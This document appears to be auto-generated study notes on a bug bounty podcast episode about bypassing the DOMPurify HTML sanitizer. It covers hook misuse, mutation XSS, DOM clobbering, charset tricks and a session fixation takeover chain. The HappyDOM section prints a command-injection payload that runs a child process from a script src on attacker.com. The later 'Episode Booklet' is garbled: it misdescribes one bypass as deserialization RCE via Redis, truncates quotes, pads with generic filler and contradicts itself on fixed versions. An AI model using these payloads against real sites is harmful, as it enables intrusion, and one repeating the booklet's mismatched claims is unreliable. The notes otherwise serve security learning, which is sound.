---
title: "How to Bypass DOMPurify in Bug Bounty with Kevin Mizu"
episode: 111
---


# Episode 111 How to Bypass DOMPurify in Bug Bounty with Kevin Mizu

### TL;DR
- Deep dive into DOMPurify hooks: `uponSanitizeAttribute` with `forceKeepAttribute` skips regex check (fixed in 3.1.5+)
- `currentNode.setAttribute()` within a hook adds attributes *after* DOMPurify collected the attribute list — bypasses all checks (still works in latest version)
- `beforeSanitizeAttributes` with ID normalization enables second-order DOM clobbering
- Post-sanitization mutations (jQuery `/>` to `>`, TinyMCE stripping U+FEFF, `.toUpperCase()` Unicode normalization K → ST) revive inline styles
- Encoding differentials: ISO-2022-JP charset sniffing when no charset is set enables server-side DOMPurify bypass
- HappyDOM RCE via `node -e` in script source with single-quote injection

### Key Takeaways
- Set a breakpoint/logpoint at the beginning of DOMPurify's `sanitize` function to inspect all configuration values (allowedTags, allowedAttributes, ALLOWED_URI_REGEX, hooks)
- `forceKeepAttribute` in `uponSanitizeAttribute` hook skips the ALL-IMPORTANT regex — if you control any part of that attribute's value, you bypass DOMPurify (fixed in 3.1.5+)
- `currentNode.setAttribute()` inside `uponSanitizeAttribute` adds attributes after DOMPurify collected the attribute snapshot — no sanitization applied to the new attribute (Cure53 cannot fix this)
- `beforeSanitizeAttributes` with ID normalization (trim, uppercase) enables form/input DOM clobbering: ID `" x"` with form pointing to `x` → link created after normalization
- Post-sanitization mutations: jQuery converts `<style/>` to `</style>`; TinyMCE strips U+FEFF (BOM); `.toUpperCase()` converts Unicode codepoint U+009C (or similar) to `ST` — each can revive a mutation XSS
- ISO-2022-JP charset (no charset set in HTTP response) enables DOMPurify bypass: escape sequence in payload switches charset mid-document
- HappyDOM executes scripts via `node -e` with the script source — single-quote injection in the path gives RCE

### Bugs and Findings

#### Bring-a-Bug: Session Fixation ATO Chain
- **Target/context:** Main web application with login page
- **Root cause:** UUIDv4 linked to two cookies (one session, one `__Host-` prefixed). App detects cookie mismatch and tries to remove cookies by reading path from request URL and using it in `Set-Cookie` header.
- **Technique / how found:** 
  1. Found XSS gadget on subdomain via Cloudflare CDN-CGI + file upload → PNG with HTML in EXIF → `document.write()` → AngularJS CSP bypass
  2. Session fixation: go to `/;domain=.` — app reads path from URL and puts it in `Set-Cookie`, but the semicolon+domain manipulation prevents cookie removal
  3. For `__Host-` cookie: go to login page with valid UUID without `__Host-` cookie; app auto-sets it to the correct value
  4. POST cross-site with `SameSite=None` session cookie set → wait for victim to login → refresh = authenticated as attacker
- **Key technical details:** `__Host-` prefix on cookie cannot be set via JavaScript; `Set-Cookie` with path from request URL enables `domain=.` injection; UUIDv4 session identifier
- **Impact / severity / bounty:** Full account takeover
- **Obstacles & how solved:** Initial XSS needed — found via Cloudflare CDN-CGI endpoint with old domain + file upload feature

#### DOMPurify `forceKeepAttribute` Bypass (fixed 3.1.5)
- **Target/context:** Apps using DOMPurify with `uponSanitizeAttribute` hook that calls `forceKeepAttribute`
- **Root cause:** DOMPurify applied the mutation-XSS regex check *before* `forceKeepAttribute` check in versions 3.1.3-3.1.5. If `forceKeepAttribute` was used, the regex was skipped entirely.
- **Technique / how found:** If developer uses `forceKeepAttribute` to preserve a custom attribute, any attribute value containing `</style>` or `</title>` or `<!--` bypasses mutation-XSS prevention
- **Key technical details:** Regex is the only defense against mutation XSS in attributes; `forceKeepAttribute` skips all sanitization on that attribute
- **Impact / severity / bounty:** Full DOMPurify bypass
- **Obstacles & how solved:** Requires developer to have used the hook with `forceKeepAttribute`

#### `currentNode.setAttribute()` Bypass (still works, unfixable)
- **Target/context:** Apps using `uponSanitizeAttribute` hook that calls `currentNode.setAttribute()`
- **Root cause:** DOMPurify collects the list of attributes *before* iterating. When `setAttribute` is called during iteration, the new attribute was not in the original list — no sanitization, no regex check.
- **Technique / how found:** Hook calls `node.setAttribute('data-' + name, value)` — the `data-*` attribute is added after the attribute list was captured, so it receives zero sanitization
- **Key technical details:** Cure53 cannot fix this — would require re-collecting attributes after each hook call, causing infinite recursion
- **Impact / severity / bounty:** Full DOMPurify bypass
- **Obstacles & how solved:** Requires developer to use `uponSanitizeAttribute` with `setAttribute`

#### HappyDOM RCE via Script Source
- **Target/context:** Server-side DOM parsing with HappyDOM
- **Root cause:** HappyDOM fetches script with specific `src` via `node -e` subprocess; the URL is single-quoted; single quotes in URL path are not encoded by default
- **Technique / how found:** Provide `<script src="http://attacker.com/'; require('child_process').execSync('calc'); '"></script>` — the single quote closes the JavaScript string, arbitrary code executes
- **Key technical details:** URL path allows single quotes; `node -e` executes JavaScript from command line; single-quoted parameter means injected quotes break out
- **Impact / severity / bounty:** RCE on the server
- **Obstacles & how solved:** Need DOMPurify to pass a script tag through (server-side config); HappyDOM instead of JSDOM

#### `.toUpperCase()` Unicode Bypass
- **Target/context:** Apps that call `.toUpperCase()` on attribute values after sanitization
- **Root cause:** Some Unicode characters normalize to ASCII when uppercased. Unicode codepoint that converts to `ST` (the `</style>` close tag) enables mutation XSS
- **Technique / how found:** Place Unicode character that uppercases to `ST` inside attribute value; after `.toUpperCase()` the attribute now contains `</STYLE>` which bypasses the regex
- **Key technical details:** The two-to-uppercase Unicode normalization converts specific codepoints to ASCII equivalents — one converts to `ST`, enabling `</STYLE>` formation
- **Impact / severity / bounty:** Full DOMPurify bypass
- **Obstacles & how solved:** Requires app to call `.toUpperCase()` on content post-sanitization

#### Encoding Differential: ISO-2022-JP Charset Sniffing
- **Target/context:** Server-side DOMPurify with no charset defined in HTTP response
- **Root cause:** Browser sniffs charset when none is set; ISO-2022-JP escape sequences can switch encoding mid-document; DOMPurify (in JSDOM) uses UTF-8 internally
- **Technique / how found:** Provide DOMPurify input with ISO-2022-JP escape sequences; payload appears harmless in UTF-8 but becomes malicious when browser parses with sniffed charset
- **Key technical details:** Japanese charset ISO-2022-JP uses escape codes (`ESC ( B` for ASCII, `ESC $ B` for Japanese); if HTTP response lacks `charset=utf-8`, browser sniffs charset from content
- **Impact / severity / bounty:** Full DOMPurify bypass (server-side)
- **Obstacles & how solved:** Requires server to not set charset in Content-Type header; Cure53 said this is unfixable (reported to Google Chrome team instead)

### Techniques and Primitives
- **DOMPurify config inspection via breakpoint** — Set a logpoint at the `sanitize` function entry; inspect `this.config` for allowedTags, allowedAttributes, ALLOWED_URI_REGEX, hooks, etc.
- **Mutation XSS via attribute encapsulation** — Put `</style>`, `</title>`, or `<!--` inside an attribute value; if DOMPurify regex misses it (or is bypassed), the browser parses the close tag and re-enters HTML context
- **Namespace confusion (SVG)** — `<svg><style>` — nodeName is uppercase in HTML namespace but lowercase in SVG namespace. If app checks `nodeName === 'STYLE'`, it fails inside SVG
- **DOM clobbering via form/input** — `<form id="x">` + `<input form="x">` creates `form.attributes` reference that can be clobbered; DOMPurify's isValidAttribute check happens before form/input link is established
- **Second-order DOMPurify bypass** — Multiple DOMPurify calls can chain bypasses (first call hides payload, second call revives it)
- **`<plaintext>` tag for blind debugging** — In PDF/headless context, `<plaintext>` reveals what the sanitizer did to your input as raw text
- **CID scheme for DOMPurify fingerprinting** — DOMPurify allows `cid:` in href by default; try `<a href="cid:">` to identify DOMPurify

### Tooling and Resources
- DOM Explorer (by YesWeHack) — live DOMPurify bypass testing
- `mizu.re` — Kevin Mizu's blog
- DOM Logger — for gadget hunting in DOM

### Suggestions and Advices from Hunter
- "If you have an HTML injection and want to know what the sanitizer does, use `<plaintext>` in blind/PDF scenarios"
- "Fingerprint DOMPurify by checking if `<a href="cid:foo">` is allowed — it's unique to DOMPurify defaults"
- "When you fix a bypass in DOM Purify, the regex is the only thing preventing mutation XSS; break the regex, break everything"
- "You can hack in your head while walking — memorize the code flow, run simulations mentally"

### AI Takeaway
The `currentNode.setAttribute()` unfixable bypass is the highest-leverage finding for current DOMPurify exploitation. Any app using `uponSanitizeAttribute` hook that calls `setAttribute` is vulnerable regardless of DOMPurify version. Also: the `.toUpperCase()` Unicode normalization bypass is broadly applicable beyond DOMPurify — test it in any sanitization context.
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Deep dive into DOMPurify hooks: `uponSanitizeAttribute` with `forceKeepAttribute` skips regex check (fixed in 3.1.5+)

#### 2. What you should learn
- Understand **set a breakpoint/logpoint at the beginning of dompurify's `sanitize` function to inspect all configuration values (allowedtags, allowedattributes, allowed_uri_regex, hooks)**
- Understand **`forcekeepattribute` in `uponsanitizeattribute` hook skips the all-important regex — if you control any part of that attribute's value, you bypass dompurify (fixed in 3.1.5+)**
- Understand **`currentnode.setattribute()` inside `uponsanitizeattribute` adds attributes after dompurify collected the attribute snapshot — no sanitization applied to the new attribute (cure53 cannot fix this)**
- Understand **`beforesanitizeattributes` with id normalization (trim, uppercase) enables form/input dom clobbering: id `" x"` with form pointing to `x` → link created after normalization**
- Understand **post-sanitization mutations: jquery converts `<style/>` to `</style>`; tinymce strips u+feff (bom); `.touppercase()` converts unicode codepoint u+009c (or similar) to `st` — each can revive a mutation xss**

#### 3. Core concepts explained
**Bring-a-Bug: Session Fixation ATO Chain**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**DOMPurify `forceKeepAttribute` Bypass (fixed 3.1.5)**
- **What it is:** Remote Code Execution via deserialization — attacker-controlled data is deserialized by the server, triggering code execution through object injection or gadget chains.
- **Why it matters:** Deserialization RCE is typically critical severity. It often requires chaining multiple primitives (object injection → Redis injection → RCE).
- **Common mistake:** Giving up when direct exploitation is blocked — look for pivoting techniques like Redis SLAVEOF replication.

**`currentNode.setAttribute()` Bypass (still works, unfixable)**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**DOMPurify config inspection via breakpoint**
- Set a logpoint at the `sanitize` function entry; inspect `this.config` for allowedTags, allowedAttributes, ALLOWED_URI_REGEX, hooks, etc.

**Mutation XSS via attribute encapsulation**
- Put `</style>`, `</title>`, or `<!--` inside an attribute value; if DOMPurify regex misses it (or is bypassed), the browser parses the close tag and re-enters HTML context

**Namespace confusion (SVG)**
- `<svg><style>` — nodeName is uppercase in HTML namespace but lowercase in SVG namespace. If app checks `nodeName === 'STYLE'`, it fails inside SVG


#### 4. Techniques and tactics
**DOMPurify config inspection via breakpoint**
- **What it is:** Set a logpoint at the `sanitize` function entry; inspect `this.config` for allowedTags, allowedAttributes, ALLOWED_URI_REGEX, hooks, etc.
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Mutation XSS via attribute encapsulation**
- **What it is:** Put `</style>`, `</title>`, or `<!--` inside an attribute value; if DOMPurify regex misses it (or is bypassed), the browser parses the close tag and re-enters HTML context
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Namespace confusion (SVG)**
- **What it is:** `<svg><style>` — nodeName is uppercase in HTML namespace but lowercase in SVG namespace. If app checks `nodeName === 'STYLE'`, it fails inside SVG
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**DOM clobbering via form/input**
- **What it is:** `<form id="x">` + `<input form="x">` creates `form.attributes` reference that can be clobbered; DOMPurify's isValidAttribute check happens before form/input link is established
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Second-order DOMPurify bypass**
- **What it is:** Multiple DOMPurify calls can chain bypasses (first call hides payload, second call revives it)
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"If you have an HTML injection and want to know what the sanitizer does, use `<plaintext>` in blind/PDF scenarios"*
- *"Fingerprint DOMPurify by checking if `<a href="cid:foo">` is allowed"* — **it's unique to DOMPurify defaults**
- *"When you fix a bypass in DOM Purify, the regex is the only thing preventing mutation XSS; break the regex, break everything"*
- *"You can hack in your head while walking"* — **memorize the code flow, run simulations mentally**

#### 6. Mental models
- **If you have an HTML injection and want to know what the sani** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Fingerprint DOMPurify by checking if `<a href="cid:foo">` is** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **When you fix a bypass in DOM Purify, the regex is the only t** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** Set a breakpoint/logpoint at the beginning of DOMPurify's `sanitize` function to inspect all configuration values (allowedTags, allowedAttributes, ALLOWED_URI_REGEX, hooks)
- **Try this:** `forceKeepAttribute` in `uponSanitizeAttribute` hook skips the ALL-IMPORTANT regex — if you control any part of that attribute's value, you bypass DOMPurify (fixed in 3.1.5+)
- **Try this:** `currentNode.setAttribute()` inside `uponSanitizeAttribute` adds attributes after DOMPurify collected the attribute snapshot — no sanitization applied to the new attribute (Cure53 cannot fix this)
- **Try this:** `beforeSanitizeAttributes` with ID normalization (trim, uppercase) enables form/input DOM clobbering: ID `" x"` with form pointing to `x` → link created after normalization

#### 8. Red flags and pitfalls
- - Obstacles & how solved: Initial XSS needed — found via Cloudflare CDN-CGI endpoint with old domain + file upload feature
- - Obstacles & how solved: Requires developer to have used the hook with `forceKeepAttribute`

#### 9. Vocabulary
- **XSS** — Cross-Site Scripting — injecting JavaScript into web pages viewed by other users
- **RCE** — Remote Code Execution — running arbitrary code on a target server

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Bring-a-Bug: Session Fixation ATO Chain?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **Deep dive into DOMPurify hooks: `uponSanitizeAttribute` with `forceKeepAttribute**
2. **Set a breakpoint/logpoint at the beginning of DOMPurify's `sanitize` function to**
3. **`forceKeepAttribute` in `uponSanitizeAttribute` hook skips the ALL-IMPORTANT reg**
